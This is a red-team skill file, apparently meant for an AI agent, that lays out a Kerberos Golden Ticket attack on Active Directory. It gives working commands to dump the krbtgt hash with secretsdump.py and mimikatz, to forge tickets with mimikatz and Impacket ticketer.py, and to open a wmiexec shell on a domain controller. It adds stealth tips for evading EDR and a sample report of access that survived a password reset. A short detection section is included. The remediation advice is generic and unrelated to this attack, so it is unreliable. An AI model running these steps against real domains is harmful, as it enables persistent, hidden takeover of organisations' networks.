---
name: active-directory-golden-ticket
description: >
  Forge highly privileged Kerberos Ticket Granting Tickets (TGTs) to gain persistent, undetectable,
  and long-term administrative access across an entire Active Directory domain. Use this skill during
  the final stages of a Red Team operation after Domain Admin access has been achieved, simulating
  an Advanced Persistent Threat (APT) establishing deep persistence that survives password resets.
domain: cybersecurity
subdomain: red-teaming
category: Persistence
difficulty: expert
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0003, TA0006]
  techniques: [T1098.002, T1558.001]
platforms: [windows, linux]
tags: [active-directory, persistence, golden-ticket, krbtgt, mimikatz, impacket, kerberos, domain-admin, red-team]
tools: [mimikatz, impacket, rubeus]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory Persistence: Golden Ticket

## When to Use
- After fully compromising an Active Directory domain (Domain Admin privileges achieved).
- To maintain long-term, stealthy access (Persistence) to a network during prolonged Red Team ops.
- To simulate high-end APT behaviors (e.g., APT29/Cozy Bear, SolarWinds breach).
- When you foresee the blue team discovering your current access and resetting traditional passwords.


## Prerequisites
- Administrative or SYSTEM-level access on the target Windows/Linux host
- Understanding of the target's monitoring posture (Sysmon, EDR coverage)
- C2 framework beacon or payload ready for deployment
- Cleanup procedure documented before persistence is established

## Workflow

### Phase 1: Obtaining the KRBTGT Hash (The Keys to the Kingdom)

```bash
# Concept: In Active Directory, the KRBTGT account is a disabled, built-in account responsible 
# for mathematically signing and encrypting all Kerberos TGT tickets.
# If we steal this account's NTLM Hash or AES key, we can theoretically sign our OWN tickets 
# that the Domain Controllers will blindly accept as valid.

# Method 1: DCSync over the network (Loudest, but easiest)
# From a machine with Domain Admin privileges (via Impacket/Linux)
secretsdump.py CORP.LOCAL/AdminUser:Password@10.10.10.5 -just-dc-user krbtgt

# Method 2: Local extraction via Mimikatz (Requires RDP/Shell to the Domain Controller)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt

# Resulting Requirement: You MUST securely record the following:
# 1. Domain Name (e.g., CORP.LOCAL)
# 2. Domain SID (e.g., S-1-5-21-29177196-1896752002-3652875151) -> Strip off the trailing -500
# 3. KRBTGT NTLM Hash (e.g., e0137ce52e935a82229dc47bc230f81d)
# Or better: KRBTGT AES256 Key (Much stealthier, harder for EDR to spot)
```

### Phase 2: Forging the Golden Ticket (Windows / Mimikatz)

```bash
# Concept: We now leave the domain controller. You can go to a completely unprivileged 
# workstation, or even a non-domain joined machine passing traffic in, and forge a ticket.

# 1. Open Mimikatz on any Windows endpoint
mimikatz # privilege::debug

# 2. Construct the purely forged ticket. Note: We assign ourselves the RID 500 (Built-in Administrator) 
# and give it a valid Active Directory group of Domain Admins (512).
mimikatz # kerberos::golden /user:FakeUser /domain:CORP.LOCAL /sid:S-1-5-21-29177196-1896752002-3652875151 /krbtgt:e0137ce52e935a82229dc47bc230f81d /id:500 /groups:512,513,518,519,520 /ptt

# Note on OPSEC: Passing `/ptt` automatically injects the forged ticket into the current memory session.
# If you pass a filename (`/ticket:golden.kirbi`), it saves it to disk for later use.

# 3. Verify the ticket is in memory
klist

# 4. Access Domain Controller C$ drive as the non-existent 'FakeUser'
dir \\dc01.corp.local\C$
# SUCCESS: Total Domain Dominance achieved.
```

### Phase 3: Forging the Golden Ticket (Linux / Impacket)

```bash
# Concept: Forge the ticket from your external Linux attack box.

# 1. Use ticketer.py to craft the Golden Ticket and save it as a .ccache file
ticketer.py -nthash e0137ce52e935a82229dc47bc230f81d -domain-sid S-1-5-21-29177196-1896752002-3652875151 -domain CORP.LOCAL FakeUser

# 2. Export the ticket variable so Impacket tools use it
export KRB5CCNAME=/path/to/FakeUser.ccache

# 3. Gain a high-privilege shell on the Domain Controller
impacket-wmiexec -k -no-pass dc01.corp.local
```

### Phase 4: Exploiting the Persistence

```bash
# Why is this so dangerous?
# 1. It operates independently of standard passwords. If the blue team realizes they are breached 
# and forces a global password reset for all Domain Admins, YOUR TICKET STILL WORKS.
# 2. The ticket is valid. Standard logging does not block it.
# 3. By default, MS allows TGTs to live for 10 hours, but a Golden Ticket can be forged to easily 
# last 10 YEARS (Mimikatz default).

# Golden Ticket vs Silver Ticket:
# Golden = Forged TGT signed by KRBTGT (Access to entire domain).
# Silver = Forged TGS signed by a specific Service Account Hash (Access ONLY to that specific mapped service, e.g., MSSQL/CIFS).
```

## 🔵 Blue Team Detection & Defense
- **The Golden Rule**: Protect Domain Admin credentials at all costs. An attacker cannot execute a Golden Ticket attack without first obtaining Domain Admin parity to dump the `krbtgt` hash.
- **Double KRBTGT Password Reset**: The ONLY way to invalidate an active Golden Ticket after a breach is discovered is to reset the `krbtgt` account password TWICE (because AD retains the N-1 historical hash for replication). There are specialized Microsoft scripts to do this safely without breaking active sessions.
- **Anomaly Detection**:
  - Alert on Kerberos tickets issued with a lifespan exceeding 10 hours (or your domain default).
  - Alert on Kerberos tickets assigned to usernames that do not exist in Active Directory (e.g., "FakeUser").
  - Alert on TGS requests encrypted with RC4 (NTLM) instead of AES256 if your domain strictly enforces AES. This is why using the AES256 key in Phase 1 is stealthier for attackers.
- **EDR Detection**: Alert on `secretsdump.py` behavioral patterns (remote registry reading of SAM/SYSTEM/SECURITY hives followed by DRSUAPI RPC calls - DCSync).

## Key Concepts
| Concept | Description |
|---------|-------------|
| KRBTGT | A default Active Directory account used as a secret key service for encrypting Kerberos Ticket Granting Tickets (TGTs) |
| DCSync | A technique to impersonate a Domain Controller to request credential replication (password hashes) from another DC |
| TGT | Ticket Granting Ticket; provides proof of identity allowing the user to request tickets to access other services |
| OPSEC | Operational Security; attempting to forge the ticket in a manner that blends in with legitimate traffic (e.g., avoiding hardcoded 10-year lifespans) |

## Output Format
```
Red Team Persistence Action Report
==================================
Execution Vector: T1558.001 (Golden Ticket Forgery)
Prerequisite Achieved: DA compromise; KRBTGT AES256 keys successfully requested via DRSUAPI (DCSync) on DC02.

Execution Details:
- Golden ticket crafted offline via Linux (ticketer.py).
- Forgery Parameters: Standard 10-hour lifespan requested to evade long-lifespan EDR detections. Username bound to standard Helpdesk user (j.smith) embedded with Domain Admin (RID 512).
- Injection: Ticket passed (PtT) into Impacket session.

Validation:
Persistence verified 48 hours later. Blue team forced password rotation, but offline Golden Ticket effectively bypassed password validations, retaining unrestricted WMI access to primary domain controllers.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- AdSecurity: [Kerberos Golden Tickets](https://adsecurity.org/?p=1515)
- MITRE ATT&CK: [Golden Ticket (T1558.001)](https://attack.mitre.org/techniques/T1558/001/)
- Impersonation Scripts: [Ticketer.py documentation](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
